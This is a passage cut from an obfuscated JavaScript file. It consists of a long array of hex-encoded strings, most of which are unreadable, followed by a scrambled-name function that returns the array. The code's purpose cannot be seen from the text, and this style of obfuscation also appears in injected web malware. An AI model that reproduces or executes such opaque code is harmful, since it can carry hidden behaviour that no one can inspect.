716b63236e752332612d7f426156236e6e202f7932657f79787663236e3a70565635564b3256327b5656237e23394d786e2e3969637024226132563273246b7e3b6e23295661566e56567e682d23327d29236e562d487d6c294c2968447f3f563c467e23786e7369563d247f7c563c562d7d2323412471325e51562369232e626e25622679256e7f2045702356695d796e25606956326868685623686e6956567d56567e564223566369236c56277f35687d60222323627525563b7869612d3d237e682e2c75353f7c70256f68565664234023693f46686e643a3f5623362d567f796856566379303c22566b2d7056626e792e687e32252f23632d3b786e526b7979322c236879567e6e2b78636e7f406f56625623326c3f32685632236123275676257f2f235256706b20695e707f7f61636e24236d662e566c327d7f796e562d79682d564a6e4d39262323244f6e562e237e2d4c6e686e623278567e7e6a306e4f786154795e56204f23243d5e56326e647f3723567e67327b7f6e23236856236e7f372b236e567f6a23712d56642356277d646e757979562e567e5e347e6423795c5662646e7c787f2d56456424426b75616532626e69562379233d56456456252564325622233279236b625b6f2856754d3260684868406a567a566e562f233d4f647e6c6c2d23567a552556647c7a7e2d6e23233a6d6a2d67626f2d4f615956256223322556642d7956227d2c6e4f4d6e6921792c70236c6f647f2f7a255f32325656646825565b756b6c56224c3f2756697d6a64635632236e322c2c6a5356616e643256565656222d7b26326856566e565674535e796b6e307f6936232d54565627565677567e2323684a6e2e565624327a65326e2d3a78255679232f562464603c23596c683223687e7832237f2d5e2323686e716e326a56757923283c643223565663686e2b692d7f326e236e5e6c45237e564c5b2c2737202356796223236862236e2b646e3256783d7552295d7c7f627a7520237e24646b326c6e7f602d56256e4f6879566945622d6379565632607056565f5665212956685e68233771202d3076793356567823622d374a48637656753270567e68482c43567f236f396e2d2336306e756e33566c2f3f2f796b326e232f277a3256235661323f233964646e2852232364633232232e23232369245e326e6f56566c7423237e2523566423743256233b793729294856694a7e6e69232f2a427f756e6f7025216e6e2d252c7f796e233a495e32456a247d6c60326e235663684564325e32246e23326627564a7f686e3552675030623832325623467f6e7d566079326e4c3234566261636b7f5f6b2d32566456257d3e56566e7c325f30327e5636236b56235629237a6e7f5645235629326e3223326b566c6b696e6f5656562d6b61236e6e6f5656233d647e69613235562522253760632378563256563b7f5668236e2d236856565e2337456268255261297d5656562e6f567f6923627456234975637a255669626c23697f696068296e602323633c396c5e7b23233236656479616232566e236a78232d612d327d4c2b24566e7e4f23233256612d566c322b56564c7920356e567621326b6f235e3a686e23584b567d3c23796764562423233223635622564f56676c6921695656526e4b26563262694256262d566866716f7e2d56322f2325495632565663296c6164566e64316e786f3f56','7f6079676e68622e6f2e','3c3c3c353d64644b754a44','3a3f7455627e575c','3e3d3c3538343a7a7e5974586f','6168636a7965','3f3f41697b5e6e6a'];iEthVEDendvFjxjpx_t=function(){return NOlhTdvICDCRcivd$aFV;};return iEthVEDendvFjxjpx_t();}
